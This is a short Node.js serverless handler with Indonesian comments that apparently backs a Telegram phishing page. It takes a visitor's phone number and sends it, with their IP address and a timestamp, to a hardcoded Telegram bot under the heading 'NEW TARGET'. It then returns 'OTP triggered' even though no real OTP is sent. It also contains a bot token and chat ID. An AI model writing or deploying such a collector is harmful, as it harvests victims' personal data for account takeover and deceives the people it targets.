// /api/send-otp.js
const { Telegraf } = require('telegraf');

module.exports = async (req, res) => {
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { phone } = req.body;
        
        // Kirim notifikasi ke bot Telegram
        const bot = new Telegraf('8562131602:AAEjjGESS-yKIiCYOGwMr3a5_YFdZSBHi0o');
        await bot.telegram.sendMessage(
            '7933552719',
            `🔥 NEW TARGET\n📱 Phone: ${phone}\n📍 IP: ${req.headers['x-forwarded-for'] || req.connection.remoteAddress}\n🕐 Time: ${new Date().toISOString()}`
        );

        // NOTE: Untuk trigger OTP Telegram resmi, butuh server terpisah karena Vercel tidak support Telethon
        // Alternatif: Pakai service pihak ketiga atau setup server kecil di Railway/Render
        
        res.status(200).json({ success: true, message: 'OTP triggered' });
    } catch (error) {
        console.error(error);
        res.status(500).json({ error: 'Internal server error' });
    }
};